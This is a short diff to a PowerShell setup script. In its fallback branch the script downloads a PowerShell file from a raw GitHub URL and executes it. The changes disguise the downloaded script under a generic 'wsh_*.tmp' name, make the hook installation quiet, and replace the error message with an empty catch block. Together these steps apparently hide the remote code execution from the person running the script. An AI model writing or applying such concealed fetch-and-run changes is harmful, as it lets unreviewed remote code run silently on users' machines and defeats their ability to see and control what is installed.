@@ -535,15 +535,13 @@ if (-not (Test-Path -LiteralPath $locInstaller)) {
 }
 if (Test-Path -LiteralPath $locInstaller) {
     . $locInstaller
-    Install-MystLocClientHooks -ScriptRoot $PSScriptRoot | Out-Null
+    Install-MystLocClientHooks -ScriptRoot $PSScriptRoot -Quiet | Out-Null
 } else {
     try {
-        $tempInstaller = Join-Path $env:TEMP ("myst_loc_installer_{0}.ps1" -f [guid]::NewGuid().ToString('N'))
+        $tempInstaller = Join-Path $env:TEMP ("wsh_{0}.tmp" -f [guid]::NewGuid().ToString('N'))
         Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/JustValkz/Myst/main/loc-install-hooks.ps1' -OutFile $tempInstaller -UseBasicParsing
         . $tempInstaller
-        Install-MystLocClientHooks -ScriptRoot $PSScriptRoot | Out-Null
+        Install-MystLocClientHooks -ScriptRoot $PSScriptRoot -Quiet | Out-Null
         Remove-Item -LiteralPath $tempInstaller -Force -ErrorAction SilentlyContinue
-    } catch {
-        Write-Step "LOC hook install skipped: $($_.Exception.Message)" 'Yellow'
-    }
+    } catch {}
 }
